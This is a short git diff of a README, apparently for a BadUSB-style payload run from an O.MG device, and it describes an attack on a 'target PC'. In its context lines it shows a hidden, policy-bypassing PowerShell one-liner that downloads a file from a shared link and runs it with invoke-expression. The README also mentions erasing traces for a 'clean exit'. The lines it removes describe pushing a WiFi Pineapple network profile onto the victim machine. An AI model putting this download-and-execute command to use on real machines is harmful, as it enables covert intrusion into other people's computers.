@@ -41,9 +41,6 @@ the powershell window and run box will be erased for a clean exit.
 ```
 powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
 ```
-* OMG Device is connected to target PC 
-* Powershell window is opened where the XML file to create the PineApple Network Profile will be generated 
-* Alternatively the XML file will be downloaded VIA an Invoke Web-Request and executed as a one liner in the Run Box
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
